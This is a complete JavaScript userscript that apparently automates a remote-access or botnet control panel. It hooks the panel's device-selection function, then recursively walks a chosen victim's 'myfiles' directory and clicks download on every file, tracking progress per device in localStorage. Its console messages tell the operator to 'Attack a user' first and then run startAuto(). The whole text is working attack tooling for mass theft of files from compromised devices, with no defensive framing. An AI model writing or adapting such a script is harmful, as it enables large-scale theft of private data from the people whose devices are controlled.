/* ============================================================
   script.js  —  auto-walk + auto-download every file
   ============================================================ */
(function () {
  if (window.__AUTO_DL_INSTALLED__) return;
  window.__AUTO_DL_INSTALLED__ = true;

  const $  = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const log  = (...a) => console.log('%c[AUTO]', 'color:#0bd;font-weight:bold', ...a);
  const warn = (...a) => console.warn('%c[AUTO]', 'color:#fa0;font-weight:bold', ...a);

  /* ---- per-user state ---- */
  let DEV = null;
  const KEY  = (d) => 'autodl::' + d;
  const load = (d) => { try { return JSON.parse(localStorage.getItem(KEY(d))) || { files:{}, dirs:{} }; } catch { return { files:{}, dirs:{} }; } };
  const save = (d, s) => localStorage.setItem(KEY(d), JSON.stringify(s));

  /* hook setdev so we always know the current user */
  const _origSetdev = window.setdev;
  Object.defineProperty(window, 'setdev', {
    configurable: true,
    get() { return _setdev; },
    set() {}
  });
  function _setdev(id) {
    DEV = id;
    log('user/device =', id);
    if (typeof _origSetdev === 'function') return _origSetdev.apply(this, arguments);
  }

  /* ---- DOM helpers ---- */
  function listItems() {
    return $$('#resp > li').map(el => {
      const txt = (el.innerText || '').trim();
      const cls = el.className || '';
      const isBack = /^\.\.$/.test(txt.split('\n')[0]);
      const name = isBack ? '..' : (txt.split('\n')[0] || '').trim();
      return {
        el, name, cls, isBack,
        isFolder: !isBack && /\bfo\b/.test(cls),
        isFile:   !isBack && /\b(fi|im|vi|au)\b/.test(cls),
      };
    });
  }
  const respSig   = () => { const r=$('#resp'); return r ? r.children.length+':'+r.innerHTML.length : '0'; };
  const inBrowser = () => { const r=$('#resp'); return !!(r && r.offsetParent !== null); };

  async function waitUntil(pred, {tick=500, stallMs=20000, onStall=null, label=''} = {}) {
    let last = Date.now();
    for (;;) {
      try { const v = pred(); if (v) return v; } catch {}
      if (Date.now() - last > stallMs) {
        warn('stalled →', label);
        if (onStall) { try { await onStall(); } catch {} }
        last = Date.now();
      }
      await sleep(tick);
    }
  }

  /* ---- navigation ---- */
  const PATH = [];
  const cwd  = () => '/' + PATH.join('/');

  async function enterFolder(item) {
    const sig = respSig();
    item.el.click();
    await waitUntil(() => respSig() !== sig && inBrowser(),
      { label:'enter '+item.name, stallMs:25000, onStall:()=>item.el.click() });
    PATH.push(item.name);
    log('cd →', cwd());
    await sleep(250);
  }
  async function goBack() {
    const back = listItems().find(i => i.isBack);
    if (!back) return false;
    const sig = respSig();
    back.el.click();
    await waitUntil(() => respSig() !== sig && inBrowser(),
      { label:'back from '+cwd(), stallMs:25000, onStall:()=>back.el.click() });
    PATH.pop();
    log('cd ←', cwd());
    await sleep(250);
    return true;
  }

  /* ---- one file ---- */
  async function downloadFile(item) {
    const state = load(DEV);
    const key = cwd() + '/' + item.name;
    if (state.files[key]) { log('skip', key); return; }

    log('open', key);
    item.el.click();

    const link = await waitUntil(() => {
      const fp = $('#fprev');
      if (!fp || fp.style.display === 'none') return null;
      const a = $('#btdwn');
      if (!a) return null;
      const href = a.getAttribute('href') || '';
      const txt  = (a.textContent || '').trim().toLowerCase();
      if (!href || href.startsWith('javascript:')) return null;
      if (txt === 'error') return null;
      return a;
    }, {
      label: 'btdwn for ' + key,
      stallMs: 30000,
      onStall: async () => {
        const fp = $('#fprev'); if (fp) fp.style.display = 'none';
        await sleep(400);
        item.el.click();
      }
    });

    log('⇩ click', key);
    link.click();

    const s2 = load(DEV); s2.files[key] = Date.now(); save(DEV, s2);

    await sleep(900);
    const fp = $('#fprev'); if (fp) fp.style.display = 'none';
    await waitUntil(() => inBrowser() && $$('#resp > li').length > 0,
      { label:'list back', stallMs:15000 });
    await sleep(200);
  }

  /* ---- recursive walk ---- */
  async function walk() {
    for (;;) {
      const state = load(DEV);
      const next = listItems().find(it => {
        if (it.isBack) return false;
        const k = cwd() + '/' + it.name;
        if (it.isFolder) return !state.dirs[k];
        if (it.isFile)   return !state.files[k];
        return false;
      });
      if (!next) return;

      if (next.isFolder) {
        await enterFolder(next);
        await walk();
        const s = load(DEV); s.dirs[cwd()] = Date.now(); save(DEV, s);
        if (PATH.length > 0) await goBack();
      } else {
        try { await downloadFile(next); }
        catch (e) { warn('err', e); await sleep(2500); }
      }
    }
  }

  /* ---- public commands ---- */
  window.startAuto = async function () {
    if (!DEV)        { warn('Click a user\'s "Attack" button first.'); return; }
    if (!inBrowser()){ warn('Open "myfiles" first.'); return; }
    PATH.length = 0;
    log('▶ start for', DEV);
    try { await walk(); log('✅ done for', DEV); }
    catch (e) { warn('fatal', e); }
  };
  window.resetAuto  = () => { if (DEV) localStorage.removeItem(KEY(DEV)); log('reset', DEV); };
  window.statusAuto = () => {
    if (!DEV) return console.log('no user');
    const s = load(DEV);
    console.log(DEV, '| files:', Object.keys(s.files).length, '| dirs:', Object.keys(s.dirs).length);
  };

  window.startAuto  = startAuto;
  window.statusAuto = statusAuto;
  window.resetAuto  = resetAuto;

  log('ready → 1) Attack a user  2) myfiles  3) startAuto()');
})();
